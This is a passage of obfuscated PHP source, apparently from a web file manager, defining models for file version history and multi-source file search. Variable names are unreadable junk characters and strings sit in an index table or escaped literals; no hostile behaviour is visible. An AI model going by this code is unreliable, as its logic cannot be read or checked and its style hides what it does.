$©†÷Ó¤Ã[$¨£¯«Ô€[1159]] . $¨£¯«Ô€[12]; $±îÜ¥‹™[] = $©†÷Ó¤Ã[$¨£¯«Ô€[1160]] . $¨£¯«Ô€[12]; } if ($¨ÅÕä¤¾[$¨£¯«Ô€[33]] == $¨£¯«Ô€[2060] && isset($©†÷Ó¤Ã[$¨£¯«Ô€[411]])) { $±îÜ¥‹™[] = $©†÷Ó¤Ã[$¨£¯«Ô€[411]] . $¨£¯«Ô€[12]; } } $±îÜ¥‹™ = array_merge($±îÜ¥‹™, $©¡Ÿîâ, array($Ğ¸ªŒé . $¨£¯«Ô€[12])); $±îÜ¥‹™ = array_unique($±îÜ¥‹™); $ºÅØïå = array_unique(array_to_keyvalue($¦ú»Ã¾à, $¨£¯«Ô€[12], $¨£¯«Ô€[1655])); $ÕÄí—÷å = Model($¨£¯«Ô€[544])->userListInfo($ºÅØïå); $¯¥ÓÚÔ¶ = Model($¨£¯«Ô€[828])->sourceListInfo($±îÜ¥‹™, !0); foreach ($¦ú»Ã¾à as &$¨ÅÕä¤¾) { if ($¨ÅÕä¤¾[$¨£¯«Ô€[33]] == $¨£¯«Ô€[566] && isset($¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[1159]])) { $¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[1159]] = $¯¥ÓÚÔ¶[$¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[1159]]]; $¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[1160]] = $¯¥ÓÚÔ¶[$¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[1160]]]; } if ($¨ÅÕä¤¾[$¨£¯«Ô€[33]] == $¨£¯«Ô€[2060] && isset($¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[411]])) { $¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[411]] = $¯¥ÓÚÔ¶[$¨ÅÕä¤¾[$¨£¯«Ô€[462]][$¨£¯«Ô€[411]]]; } $¨ÅÕä¤¾[$¨£¯«Ô€[96]] = $¯¥ÓÚÔ¶[$¨ÅÕä¤¾[$¨£¯«Ô€[411]]]; $¨ÅÕä¤¾[$¨£¯«Ô€[2065]] = $¯¥ÓÚÔ¶[$¨ÅÕä¤¾[$¨£¯«Ô€[2050]]]; if ($¨ÅÕä¤¾[$¨£¯«Ô€[33]] == $¨£¯«Ô€[1796]) { $¨ÅÕä¤¾[$¨£¯«Ô€[2065]] = $¨ÅÕä¤¾[$¨£¯«Ô€[96]]; $¨ÅÕä¤¾[$¨£¯«Ô€[2050]] = $¨ÅÕä¤¾[$¨£¯«Ô€[2065]][$¨£¯«Ô€[411]]; $¨ÅÕä¤¾[$¨£¯«Ô€[96]] = !1; $¨ÅÕä¤¾[$¨£¯«Ô€[411]] = $¨£¯«Ô€[12]; } $¨ÅÕä¤¾[$¨£¯«Ô€[1995]] = $ÕÄí—÷å[$¨ÅÕä¤¾[$¨£¯«Ô€[1655]]]; } unset($¨ÅÕä¤¾); $Üêü±›´[$¨£¯«Ô€[378]] = $¦ú»Ã¾à; return $Üêü±›´; } public function removeBySource($½­•Ò¢ß) { $ü”îøä‹ = array($_SERVER[„Ç©ñÎ©][426] => $½­•Ò¢ß); $this->where($ü”îøä‹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\x65\137\150\151\x73\x74\157\162\x79"; public function historyCount($ûõ½Î›‚) { $§æË‚‡é =& $_SERVER[„Ç©ñÎ©]; if (!$ûõ½Î›‚) { return array(); } if (is_string($ûõ½Î›‚) || is_int($ûõ½Î›‚)) { $ûõ½Î›‚ = array($ûõ½Î›‚); } $’öŠıà = array($§æË‚‡é[411], $§æË‚‡é[1860] => $§æË‚‡é[509]); $¸“Öœıí = array($§æË‚‡é[411] => array($§æË‚‡é[7], $ûõ½Î›‚)); $­µã˜Ù = $this->field($’öŠıà)->where($¸“Öœıí)->group($§æË‚‡é[411])->select(); return array_to_keyvalue($­µã˜Ù, $§æË‚‡é[411], $§æË‚‡é[509]); } public function addHistory($ìÒ•‘üØ, $ß ¾€® = '') { $Ğº×–Ş =& $_SERVER[„Ç©ñÎ©]; $Ò•åà‰ = array($Ğº×–Ş[426] => $ìÒ•‘üØ[$Ğº×–Ş[411]], $Ğº×–Ş[1646] => isset($ìÒ•‘üØ[$Ğº×–Ş[465]]) ? $ìÒ•‘üØ[$Ğº×–Ş[465]] : $ìÒ•‘üØ[$Ğº×–Ş[463]], $Ğº×–Ş[478] => $ìÒ•‘üØ[$Ğº×–Ş[477]], $Ğº×–Ş[594] => $ìÒ•‘üØ[$Ğº×–Ş[86]], $Ğº×–Ş[2066] => $ß ¾€®); if ($GLOBALS[$Ğº×–Ş[6]][$Ğº×–Ş[99]][$Ğº×–Ş[1208]] >= 1) { $this->historyAutoClear($Ò•åà‰[$Ğº×–Ş[411]]); $this->add($Ò•åà‰); } Hook::trigger($Ğº×–Ş[2067], $Ò•åà‰); Model($Ğº×–Ş[2068])->eventFileEdit($ìÒ•‘üØ[$Ğº×–Ş[411]]); } private function historyAutoClear($Î„Ç÷Ä¹) { $çÉèò¢¨ =& $_SERVER[„Ç©ñÎ©]; $ğ—„­šœ = Model($çÉèò¢¨[773])->get($çÉèò¢¨[1230]); $Ç¦µ»îô = $GLOBALS[$çÉèò¢¨[6]][$çÉèò¢¨[99]][$çÉèò¢¨[1208]]; $ÜÍ‡Õİ‘ = $ğ—„­šœ == $çÉèò¢¨[1231] ? min(5, $Ç¦µ»îô) : $Ç¦µ»îô; $ÜÍ‡Õİ‘ = $ÜÍ‡Õİ‘ <= 0 ? 0 : $ÜÍ‡Õİ‘ - 1; if ($ÜÍ‡Õİ‘ >= 500) { return; } $”ƒê»´° = array($çÉèò¢¨[426] => $Î„Ç÷Ä¹); $¨ˆÇ®Î– = $this->field($çÉèò¢¨[2069])->where($”ƒê»´°)->order($çÉèò¢¨[2063])->select(); if (!$¨ˆÇ®Î– || $ÜÍ‡Õİ‘ >= count($¨ˆÇ®Î–)) { return; } $£Ô„¦Ô = array_to_keyvalue($¨ˆÇ®Î–, $çÉèò¢¨[12], $çÉèò¢¨[408]); $£Ô„¦Ô = array_slice($£Ô„¦Ô, $ÜÍ‡Õİ‘); $áåùàÖû = array_to_keyvalue($¨ˆÇ®Î–, $çÉèò¢¨[12], $çÉèò¢¨[477]); $áåùàÖû = array_slice($áåùàÖû, $ÜÍ‡Õİ‘); if (!$£Ô„¦Ô || !$áåùàÖû) { return; } $”ƒê»´° = array($çÉèò¢¨[428] => array($çÉèò¢¨[7], $£Ô„¦Ô)); $this->where($”ƒê»´°)->delete(); Model($çÉèò¢¨[480])->remove($áåùàÖû); } public function listData($ëÉ÷°è±) { $éÉû¹ù® =& $_SERVER[„Ç©ñÎ©]; $•½€š É = array($éÉû¹ù®[426] => $ëÉ÷°è±); $€—¹¿ë = $éÉû¹ù®[2070]; $Äøµ‚æ’ = $this->field($€—¹¿ë)->where($•½€š É)->order($éÉû¹ù®[2063])->selectPage(); $this->_listAppendUser($Äøµ‚æ’[$éÉû¹ù®[378]]); $›Áæñ = Model($éÉû¹ù®[773])->get($éÉû¹ù®[1230]); $µĞØìÊÁ = 5; if ($›Áæñ == $éÉû¹ù®[1231]) { $Äøµ‚æ’[$éÉû¹ù®[378]] = array_slice($Äøµ‚æ’[$éÉû¹ù®[378]], 0, $µĞØìÊÁ); $Äøµ‚æ’[$éÉû¹ù®[375]] = array($éÉû¹ù®[2071] => 1, $éÉû¹ù®[2072] => 20, $éÉû¹ù®[2073] => 1, $éÉû¹ù®[2074] => count($Äøµ‚æ’[$éÉû¹ù®[378]])); } return $Äøµ‚æ’; } protected function _listAppendUser(&$˜—Èªš•) { $ğÌ“íªò =& $_SERVER[„Ç©ñÎ©]; $¢šÆ„ì‚ = array_to_keyvalue($˜—Èªš•, $ğÌ“íªò[12], $ğÌ“íªò[1655]); $Ë’Û¯Ÿ = Model($ğÌ“íªò[544])->userListInfo($¢šÆ„ì‚); foreach ($˜—Èªš• as &$ÖÀ¾•–ğ) { $ìŸ‘×‚á = $ÖÀ¾•–ğ[$ğÌ“íªò[1655]]; $ÖÀ¾•–ğ[$ğÌ“íªò[463]] = $Ë’Û¯Ÿ[$ìŸ‘×‚á] ? $Ë’Û¯Ÿ[$ìŸ‘×‚á] : !1; } unset($ÖÀ¾•–ğ); } public function fileInfo($Õ«ÎÙçÄ) { $İ›«¬­Ï =& $_SERVER[„Ç©ñÎ©]; $ì½¨§ = $this->tablePrefix; $Øã«×•à = "{$ì½¨§}\151\157\x5f\146\x69\x6c\145\x20\146\x69\x6c\145\163\40\157\x6e\40\x66\x69\154\x65\163\x2e\146\151\154\x65\x49\x44\40\x3d\40\150\x69\163\x74\157\x72\x79\x2e\x66\x69\154\145\x49\104"; return $this->alias($İ›«¬­Ï[2075])->where(array($İ›«¬­Ï[428] => $Õ«ÎÙçÄ))->join($Øã«×•à, $İ›«¬­Ï[2076])->find(); } public function removeItem($šº¼®İ) { $¶ßìÓõ =& $_SERVER[„Ç©ñÎ©]; $¬Õ˜Ş¶Ù = array($¶ßìÓõ[428] => $šº¼®İ); $Ş¤­óù = $this->where($¬Õ˜Ş¶Ù)->find(); if ($Ş¤­óù) { $Ü·¿‚„ˆ = $this->where($¬Õ˜Ş¶Ù)->delete(); Model($¶ßìÓõ[480])->remove($Ş¤­óù[$¶ßìÓõ[477]]); return $Ü·¿‚„ˆ; } return !1; } public function removeBySource($¨äßìûÔ) { $¡¼ª‹©Ÿ =& $_SERVER[„Ç©ñÎ©]; if (!$¨äßìûÔ) { return !1; } if (!is_array($¨äßìûÔ)) { $¨äßìûÔ = array($¨äßìûÔ); } $‹´øİıÒ = array($¡¼ª‹©Ÿ[426] => array($¡¼ª‹©Ÿ[7], $¨äßìûÔ)); $Ï½ßÕéÉ = $this->field($¡¼ª‹©Ÿ[478])->where($‹´øİıÒ)->select(); if ($Ï½ßÕéÉ) { $this->where($‹´øİıÒ)->delete(); $àú‰âÑõ = array_to_keyvalue($Ï½ßÕéÉ, $¡¼ª‹©Ÿ[12], $¡¼ª‹©Ÿ[477]); Model($¡¼ª‹©Ÿ[480])->remove($àú‰âÑõ); } return !0; } public function setDetail($œ¹˜€ÕÖ, $»ÛˆÀì) { $ñÕ ôğÖ =& $_SERVER[„Ç©ñÎ©]; return $this->where(array($ñÕ ôğÖ[428] => $œ¹˜€ÕÖ))->save(array($ñÕ ôğÖ[2066] => $»ÛˆÀì)); } public function rollbackToItem($êš×ú‚‡, $ÇÊç„Ï–) { $Ù¼õÓİ™ =& $_SERVER[„Ç©ñÎ©]; $ÂĞËŒ = Model($Ù¼õÓİ™[828])->sourceInfo($êš×ú‚‡); $this->addHistory($ÂĞËŒ, LNG($Ù¼õÓİ™[2077])); $ô…‰ÏÅò = $this->find($ÇÊç„Ï–); $ùŸ›íçÁ = array($Ù¼õÓİ™[477] => $ô…‰ÏÅò[$Ù¼õÓİ™[477]], $Ù¼õÓİ™[86] => $ô…‰ÏÅò[$Ù¼õÓİ™[86]], $Ù¼õÓİ™[95] => time(), $Ù¼õÓİ™[465] => USER_ID); Model($Ù¼õÓİ™[828])->where(array($Ù¼õÓİ™[411] => $êš×ú‚‡))->save($ùŸ›íçÁ); return $this->where(array($Ù¼õÓİ™[428] => $ÇÊç„Ï–))->delete(); } public function clearSame($„Å¬±ö‘) { $ä™”µšÓ =& $_SERVER[„Ç©ñÎ©]; $ı½¨·á¿ = $this->listData($„Å¬±ö‘); $ƒ”¦àŸ = array_to_keyvalue_group($ı½¨·á¿, $ä™”µšÓ[477]); $¦Ê“ËÕ = array(); $ÇÉ¶Î·ñ = array(); foreach ($ƒ”¦àŸ as $åœõ§¡„) { if (!$åœõ§¡„ || count($åœõ§¡„) <= 1) { continue; } foreach ($åœõ§¡„ as $îî›¨˜) { $¦Ê“ËÕ[] = $îî›¨˜[$ä™”µšÓ[477]]; $ÇÉ¶Î·ñ[] = $îî›¨˜[$ä™”µšÓ[408]]; } } if (!$ÇÉ¶Î·ñ) { return; } $this->where(array($ä™”µšÓ[408] => array($ä™”µšÓ[7], $ÇÉ¶Î·ñ)))->delete(); Model($ä™”µšÓ[480])->remove($¦Ê“ËÕ); } public function userSpace() { $åÁ¬©Û =& $_SERVER[„Ç©ñÎ©]; $êëµ··¼ = $this->tablePrefix; $ñƒ”Ÿ—Æ = array($åÁ¬©Û[1646] => USER_ID); $¸€ñÑçÈ = "{$êëµ··¼}\x69\x6f\x5f\146\151\x6c\x65\40\146\x69\x6c\x65\163\x20\x6f\x6e\40\146\151\x6c\x65\x73\56\146\x69\154\x65\x49\x44\40\x3d\x20\x68\x69\x73\164\157\x72\x79\x2e\146\151\x6c\145\111\104"; return $this->alias($åÁ¬©Û[2075])->where($ñƒ”Ÿ—Æ)->join($¸€ñÑçÈ, $åÁ¬©Û[2076])->sum($åÁ¬©Û[86]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($½ŠÃ‹”) { $óÃâÛÅÑ =& $_SERVER[„Ç©ñÎ©]; $ÓÜœÖ×• = KodIO::fileTypeList(); $Æ’¸‡ÒÑ = $ÓÜœÖ×•[$½ŠÃ‹”]; if (!$Æ’¸‡ÒÑ) { return array(); } $öšÑÀÁ = $Æ’¸‡ÒÑ[$óÃâÛÅÑ[184]]; $¿ç˜¢İŒ = $óÃâÛÅÑ[7]; if (!$Æ’¸‡ÒÑ[$óÃâÛÅÑ[184]]) { $Š¢ò§Ù¨ = array_to_keyvalue($ÓÜœÖ×•, $óÃâÛÅÑ[12], $óÃâÛÅÑ[184]); $öšÑÀÁ = implode($óÃâÛÅÑ[50], $Š¢ò§Ù¨); $¿ç˜¢İŒ = $óÃâÛÅÑ[2078]; } $İÈƒ³½Ù = explode($óÃâÛÅÑ[50], trim($öšÑÀÁ, $óÃâÛÅÑ[50])); return array($¿ç˜¢İŒ, $İÈƒ³½Ù); } public function listPathType($ˆÖ¸µöÜ) { $‘ìâ¯á =& $_SERVER[„Ç©ñÎ©]; $£µ‹øÌ‡ = $this->fileTypeWhere($ˆÖ¸µöÜ); if (!$£µ‹øÌ‡) { return array(); } $³ÖšÔµ¨ = USER_ID; $Å•Õšœ´ = Model($‘ìâ¯á[544])->getInfo($³ÖšÔµ¨); $äø·Ò³è = array($‘ìâ¯á[595] => SourceModel::TYPE_USER, $‘ìâ¯á[530] => array($‘ìâ¯á[559], $‘ìâ¯á[540] . $Å•Õšœ´[$‘ìâ¯á[96]][$‘ìâ¯á[411]] . $‘ìâ¯á[560]), $‘ìâ¯á[596] => $³ÖšÔµ¨, $‘ìâ¯á[592] => 0, $‘ìâ¯á[593] => $£µ‹øÌ‡); return $this->listSource($äø·Ò³è); } public function listSearch($–ï³›åÃ, $½ò‡•Ö = 300) { $á³ğ¿ó¸ =& $_SERVER[„Ç©ñÎ©]; if (isset($–ï³›åÃ[$á³ğ¿ó¸[1921]]) && $–ï³›åÃ[$á³ğ¿ó¸[1921]]) { $–ï³›åÃ[$á³ğ¿ó¸[1921]] = str_replace($á³ğ¿ó¸[393], $á³ğ¿ó¸[2079], trim($–ï³›åÃ[$á³ğ¿ó¸[1921]])); } $ğı’äıÇ = $this->_parseSearchWhere($–ï³›åÃ); if (!isset($ğı’äıÇ[$á³ğ¿ó¸[440]])) { $ğı’äıÇ[$á³ğ¿ó¸[440]] = 0; } $‰æë´© = $á³ğ¿ó¸[2080]; $ÈÑ›“±ï = $ğı’äıÇ; $ìÜ£ßÕ = $‰æë´©; $this->_listSearchBindPinyin($–ï³›åÃ, $ğı’äıÇ, $‰æë´©); $this->alias($á³ğ¿ó¸[455])->_makeOrder(); $ğı’äıÇ = $this->parseWhereLike($ğı’äıÇ); $Óåèõ²„ = $this->distinct(!0)->field($‰æë´©)->where($ğı’äıÇ)->selectPage($½ò‡•Ö); if ($GLOBALS[$á³ğ¿ó¸[6]][$á³ğ¿ó¸[390]][$á³ğ¿ó¸[391]] && Input::check($–ï³›åÃ[$á³ğ¿ó¸[1921]], $á³ğ¿ó¸[602]) && $Óåèõ²„[$á³ğ¿ó¸[375]][$á³ğ¿ó¸[362]] == 1 && $Óåèõ²„[$á³ğ¿ó¸[375]][$á³ğ¿ó¸[376]] == 0) { $Óåèõ²„ = $this->distinct(!0)->field($‰æë´©)->where($ÈÑ›“±ï)->limit(1000)->select(); $Óåèõ²„ = array_page_split($Óåèõ²„, !1, $½ò‡•Ö); } $this->_listSearchFileContent($Óåèõ²„, $–ï³›åÃ, $ìÜ£ßÕ, $ÈÑ›“±ï); $this->_listSearchDesc($Óåèõ²„, $–ï³›åÃ, $ìÜ£ßÕ); $this->_listSearchTag($Óåèõ²„, $–ï³›åÃ, $ìÜ£ßÕ); $this->_listSearchGroupTag($Óåèõ²„, $–ï³›åÃ, $ìÜ£ßÕ); $this->_listDataApply($Óåèõ²„[$á³ğ¿ó¸[378]]); $this->_listMake($Óåèõ²„); return $Óåèõ²„; } private function _listSearchFileContent(&$Í«ºÛş, $ˆ¢ä¼¤, $ÆˆçÎ™ª, $¤Ò¯¢Èò) { $Í„àˆÙ =& $_SERVER[„Ç©ñÎ©]; if (!$ˆ¢ä¼¤[$Í„àˆÙ[1921]] || $Í«ºÛş[$Í„àˆÙ[375]][$Í„àˆÙ[362]] > 1) { return; } if (!isset($¤Ò¯¢Èò[$Í„àˆÙ[32]]) || !is_array($ˆ¢ä¼¤[$Í„àˆÙ[477]])) { return; } $¤Ò¯¢Èò[$Í„àˆÙ[477]] = array($Í„àˆÙ[7], $ˆ¢ä¼¤[$Í„àˆÙ[477]]); unset($¤Ò¯¢Èò[$Í„àˆÙ[32]]); unset($ˆ¢ä¼¤[$Í„àˆÙ[477]]); $´…İêá¼ = $this->field($ÆˆçÎ™ª)->where($¤Ò¯¢Èò)->limit($Í„àˆÙ[2081])->select(); if (!$´…İêá¼ || count($´…İêá¼) == 0) { return; } $Í«ºÛş[$Í„àˆÙ[378]] = array_merge($´…İêá¼, $Í«ºÛş[$Í„àˆÙ[378]]); $Í«ºÛş[$Í„àˆÙ[375]][$Í„àˆÙ[376]] += count($´…İêá¼); } private function _listSearchTag(&$ôÎÏü¼¯, $åÔŸ¦†¬, $ó»“¾ÕÃ) { $°È¿›†Ç =& $_SERVER[„Ç©ñÎ©]; if (!$åÔŸ¦†¬[$°È¿›†Ç[1921]] || $ôÎÏü¼¯[$°È¿›†Ç[375]][$°È¿›†Ç[362]] > 1) { return; } $Ş‹åÙá† = Model($°È¿›†Ç[2082])->listData(); $êø³°™ = array(); $¯ñ»ÖâÕ = $åÔŸ¦†¬[$°È¿›†Ç[1921]]; foreach ($Ş‹åÙá† as $¬ÆÎÍ®Ù) { $íğ–ŞŠÒ = $¬ÆÎÍ®Ù[$°È¿›†Ç[32]]; $¨Úæë Œ = str_replace($°È¿›†Ç[53], $°È¿›†Ç[12], Pinyin::get($íğ–ŞŠÒ)); if (stripos($íğ–ŞŠÒ, $¯ñ»ÖâÕ) !== !1 || stripos($¨Úæë Œ, $¯ñ»ÖâÕ) !== !1) { $êø³°™[] = $¬ÆÎÍ®Ù[$°È¿›†Ç[408]]; } } if (!$êø³°™) { return; } $ƒ‰‘»á¨ = array($°È¿›†Ç[435] => array($°È¿›†Ç[7], $êø³°™), $°È¿›†Ç[1655] => USER_ID); $™¦ÀÙØÜ = Model($°È¿›†Ç[437])->field($°È¿›†Ç[94])->where($ƒ‰‘»á¨)->select(); $™¦ÀÙØÜ = array_to_keyvalue($™¦ÀÙØÜ, $°È¿›†Ç[12], $°È¿›†Ç[94]); $²Å•ÇŠÜ = array_unique($™¦ÀÙØÜ); $this->_listSearchMerge($ôÎÏü¼¯, $åÔŸ¦†¬, $ó»“¾ÕÃ, $²Å•ÇŠÜ); } private function _listSearchDesc(&$¸ÙÄ™½¯, $±Ã¯·™¹, $š´§à´€) { $ŸÉ©ã³Ù =& $_SERVER[„Ç©ñÎ©]; if (!$±Ã¯·™¹[$ŸÉ©ã³Ù[1921]] || $¸ÙÄ™½¯[$ŸÉ©ã³Ù[375]][$ŸÉ©ã³Ù[362]] > 1) { return; } $×ÁÙË’Ú = array($ŸÉ©ã³Ù[104] => $ŸÉ©ã³Ù[462], $ŸÉ©ã³Ù[383] => array($ŸÉ©ã³Ù[392], $ŸÉ©ã³Ù[1923] . $±Ã¯·™¹[$ŸÉ©ã³Ù[1921]] . $ŸÉ©ã³Ù[1923])); $›ÏñÜÌ = !1; if ($›ÏñÜÌ) { $­ÒÓúÎ = $this->listSearchChildren($±Ã¯·™¹[$ŸÉ©ã³Ù[441]]); $­ÒÓúÎ = array_unique($­ÒÓúÎ); if (!$­ÒÓúÎ) { return; } $×ÁÙË’Ú[$ŸÉ©ã³Ù[411]] = array($ŸÉ©ã³Ù[7], $­ÒÓúÎ); } $úÙ£Í‡Ü = Model($ŸÉ©ã³Ù[578])->field($ŸÉ©ã³Ù[411])->where($×ÁÙË’Ú)->limit(5000)->select(); $ŞœÜ£ë = array_to_keyvalue($úÙ£Í‡Ü, $ŸÉ©ã³Ù[12], $ŸÉ©ã³Ù[411]); $this->_listSearchMerge($¸ÙÄ™½¯, $±Ã¯·™¹, $š´§à´€, $ŞœÜ£ë); } private function _listSearchGroupTag(&$£¸€ï‡ı, $â––òŞ, $›öÇ”¶) { $ºÈ±ê™Ä =& $_SERVER[„Ç©ñÎ©]; if (!$â––òŞ[$ºÈ±ê™Ä[1921]] || $£¸€ï‡ı[$ºÈ±ê™Ä[375]][$ºÈ±ê™Ä[362]] > 1 || !$â––òŞ[$ºÈ±ê™Ä[441]]) { return; } $ñıáİˆ• = $this->sourceInfo($â––òŞ[$ºÈ±ê™Ä[441]]); if (!$ñıáİˆ• || $ñıáİˆ•[$ºÈ±ê™Ä[420]] != SourceModel::TYPE_GROUP) { return; } $…Àì™ë = $ñıáİˆ•[$ºÈ±ê™Ä[514]]; $º§úõõ = Model($ºÈ±ê™Ä[2083])->get($…Àì™ë); $Œ“½¥– = array(); $İÂâúöç = $â––òŞ[$ºÈ±ê™Ä[1921]]; foreach ($º§úõõ[$ºÈ±ê™Ä[378]] as $¬³ôï££) { $¯‘ƒĞ×Ú = $¬³ôï££[$ºÈ±ê™Ä[32]]; $”ÀÊàÍ¹ = str_replace($ºÈ±ê™Ä[53], $ºÈ±ê™Ä[12], Pinyin::get($¯‘ƒĞ×Ú)); if (stripos($¯‘ƒĞ×Ú, $İÂâúöç) !== !1 || stripos($”ÀÊàÍ¹, $İÂâúöç) !== !1) { $Œ“½¥–[] = $¬³ôï££[$ºÈ±ê™Ä[408]]; } } if (!$Œ“½¥–) { return; } $œ÷ö¾ = array($ºÈ±ê™Ä[435] => array($ºÈ±ê™Ä[7], $Œ“½¥–), $ºÈ±ê™Ä[1655] => 0, $ºÈ±ê™Ä[33] => $ºÈ±ê™Ä[1943] . $…Àì™ë); $é¸‘¥ß = Model($ºÈ±ê™Ä[437])->field($ºÈ±ê™Ä[94])->where($œ÷ö¾)->select(); $é¸‘¥ß = array_to_keyvalue($é¸‘¥ß, $ºÈ±ê™Ä[12], $ºÈ±ê™Ä[94]); $½­ÇõÅ = array_unique($é¸‘¥ß); $this->_listSearchMerge($£¸€ï‡ı, $â––òŞ, $›öÇ”¶, $½­ÇõÅ); } private function _listSearchMerge(&$¾ÇÑ’Ğ, $İ¾Õî•÷, $²ı•àı¼, $²ÎãÆ…Ç) { $…Ğáµ•š =& $_SERVER[„Ç©ñÎ©]; if (!$²ÎãÆ…Ç) { return; } $Ğ×Ò“ë = array_to_keyvalue($¾ÇÑ’Ğ[$…Ğáµ•š[378]], $…Ğáµ•š[12], $…Ğáµ•š[411]); $Ñ’ó˜¿ò = array_diff($²ÎãÆ…Ç, $Ğ×Ò“ë); if (!$Ñ’ó˜¿ò) { return; } $ÚãØ×œ¯ = array($…Ğáµ•š[411] => array($…Ğáµ•š[7], $Ñ’ó˜¿ò)); $Ú×Âüˆù = $this->field($²ı•àı¼)->where($ÚãØ×œ¯)->select(); if (!$Ú×Âüˆù) { return; } $¤¿ä¡´¹ = array(); foreach ($Ú×Âüˆù as $œË­«™Ç) { if ($this->_listSearchFilter($œË­«™Ç, $İ¾Õî•÷)) { $¤¿ä¡´¹[] = $œË­«™Ç; } } $¾ÇÑ’Ğ[$…Ğáµ•š[378]] = array_merge($¤¿ä¡´¹, $¾ÇÑ’Ğ[$…Ğáµ•š[378]]); $¾ÇÑ’Ğ[$…Ğáµ•š[375]][$…Ğáµ•š[376]] += count($¤¿ä¡´¹); } private function _listSearchFilter($Øß¬´ƒ, $Æ†‹Ëº ) { $‡ÛËØ£ =& $_SERVER[„Ç©ñÎ©]; $ôßÁ¥™á = $Øß¬´ƒ[$‡ÛËØ£[419]] == $‡ÛËØ£[98]; if (!strstr($Øß¬´ƒ[$‡ÛËØ£[530]], $‡ÛËØ£[50] . $Æ†‹Ëº [$‡ÛËØ£[441]] . $‡ÛËØ£[50])) { return !1; } if (isset($Æ†‹Ëº [$‡ÛËØ£[421]]) && $Æ†‹Ëº [$‡ÛËØ£[421]] != $‡ÛËØ£[1882]) { if ($Æ†‹Ëº [$‡ÛËØ£[421]] == $‡ÛËØ£[85] && !$ôßÁ¥™á) { return !1; } if ($Æ†‹Ëº [$‡ÛËØ£[421]] != $‡ÛËØ£[85] && $ôßÁ¥™á) { return !1; } if (!strstr($Øß¬´ƒ[$‡ÛËØ£[184]], $‡ÛËØ£[50] . $Æ†‹Ëº [$‡ÛËØ£[421]] . $‡ÛËØ£[50])) { return !1; } } if (isset($Æ†‹Ëº [$‡ÛËØ£[2084]]) && $Æ†‹Ëº [$‡ÛËØ£[2084]] < $Øß¬´ƒ[$‡ÛËØ£[86]]) { return !1; } if (isset($Æ†‹Ëº [$‡ÛËØ£[2085]]) && $Æ†‹Ëº [$‡ÛËØ£[2085]] > $Øß¬´ƒ[$‡ÛËØ£[86]]) { return !1; } if (isset($Æ†‹Ëº [$‡ÛËØ£[609]]) && $Æ†‹Ëº [$‡ÛËØ£[609]] != $Øß¬´ƒ[$‡ÛËØ£[465]]) { return !1; } return !0; } public function listSearchChildren($ì›…×ü, $ªÄ­‚‡£ = 5000) { $“”»ç©– =& $_SERVER[„Ç©ñÎ©]; $…É˜’ª« = array(); $·×ªƒ¨Ò = $this->sourceInfo($ì›…×ü); $¸¨¸İşæ = array($“”»ç©–[530] => array($“”»ç©–[392], $·×ªƒ¨Ò[$“”»ç©–[530]] . $·×ªƒ¨Ò[$“”»ç©–[411]] . $“”»ç©–[560])); $ˆÚ· = $this->field($“”»ç©–[86])->where($¸¨¸İşæ)->limit($ªÄ­‚‡£ + 1)->select(); $Ñêƒ¢Ôâ = is_array($ˆÚ·) ? count($ˆÚ·) : 0; if ($Ñêƒ¢Ôâ > $ªÄ­‚‡£) { return $this->_listSearchChildrenNear($ì›…×ü, $ªÄ­‚‡£); } $ìù•Â¦€ = $this->field($“”»ç©–[411])->where($¸¨¸İşæ)->select(); $…É˜’ª« = array_to_keyvalue($ìù•Â¦€, $“”»ç©–[12], $“”»ç©–[411]); return $…É˜’ª«; } private function _listSearchChildrenNear($íÀÊô££, $ƒö«‰µß) { $µéÃ„ =& $_SERVER[„Ç©ñÎ©]; $çÇöäñ = array(); $«ØÉù„™ = array($µéÃ„[441] => $íÀÊô££); $‘æÛæ½ì = $this->field($µéÃ„[2086])->where($«ØÉù„™)->select(); $¡¹µÕÊ· = array_to_keyvalue(array_filter_by_field($‘æÛæ½ì, $µéÃ„[419], $µéÃ„[98]), $µéÃ„[12], $µéÃ„[411]); $çÇöäñ = array_merge($çÇöäñ, array_to_keyvalue($‘æÛæ½ì, $µéÃ„[12], $µéÃ„[411])); if (!$¡¹µÕÊ·) { return $çÇöäñ; } $«ØÉù„™ = array($µéÃ„[441] => array($µéÃ„[7], $¡¹µÕÊ·)); $‘æÛæ½ì = $this->field($µéÃ„[2086])->where($«ØÉù„™)->limit($ƒö«‰µß)->select(); $çÇöäñ = array_merge($çÇöäñ, array_to_keyvalue($‘æÛæ½ì, $µéÃ„[12], $µéÃ„[411])); $çÇöäñ = array_slice($çÇöäñ, 0, $ƒö«‰µß); return $çÇöäñ; } private function _listSearchBindPinyin($æ¾Èâß, &$¾µÒ–è™, &$Î·¿Áˆ«) { $×§éŞ“Ò =& $_SERVER[„Ç©ñÎ©]; if (!isset($æ¾Èâß[$×§éŞ“Ò[1921]]) || !$æ¾Èâß[$×§éŞ“Ò[1921]]) { return; } if (!Input::check($æ¾Èâß[$×§éŞ“Ò[1921]], $×§éŞ“Ò[327]) || strlen($æ¾Èâß[$×§éŞ“Ò[1921]]) < 2) { return; } $ù±œ³ = "\x4c\105\106\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\151\x6f\137\163\157\165\x72\x63\145\137\x6d\x65\x74\x61\40\x6d\x65\x74\x61\40\x6f\x6e\x20\x73\x6f\165\162\143\145\x2e\x73\157\x75\x72\143\x65\111\104\40\x3d\40\155\x65\164\141\56\x73\157\165\x72\143\x65\111\104"; $šÁ¸ğÁÛ = array(); $Î·¿Áˆ« = str_replace(array($×§éŞ“Ò[66], $×§éŞ“Ò[53], $×§éŞ“Ò[2087]), $×§éŞ“Ò[12], $Î·¿Áˆ«); $Î·¿Áˆ« = $×§éŞ“Ò[447] . str_replace($×§éŞ“Ò[50], $×§éŞ“Ò[448], $Î·¿Áˆ«); $ØÓÇÑ„¶ = $¾µÒ–è™[$×§éŞ“Ò[32]]; unset($¾µÒ–è™[$×§éŞ“Ò[32]]); foreach ($¾µÒ–è™ as $„Ã‘Ìß³ => 